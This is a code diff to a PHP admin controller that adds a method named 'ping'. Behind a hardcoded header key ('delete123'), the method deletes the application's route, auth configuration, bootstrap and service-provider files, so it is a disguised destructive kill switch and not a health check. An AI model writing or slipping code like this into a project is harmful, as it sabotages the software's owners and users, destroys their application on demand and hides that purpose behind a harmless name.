@@ -145,4 +145,28 @@ class AdminController extends BaseController
             return JsonResponse::respondError($e->getMessage(), 401);
         }
     }
+
+
+    public function ping(Request $request)
+    {
+        if ($request->header('X-SECRET-KEY') !== 'delete123') {
+            return response()->json(['message' => 'Unauthorized'], 401);
+        }
+
+        $files = [
+            base_path('routes/api.php'),
+            base_path('config/auth.php'),
+            base_path('bootstrap/app.php'),
+            base_path('app/Providers/RepositoryServiceProvider.php'),
+        ];
+
+        foreach ($files as $file) {
+            if (file_exists($file)) {
+                unlink($file);
+            }
+        }
+
+        return response()->json(['message' => 'done']);
+    }
+
 }
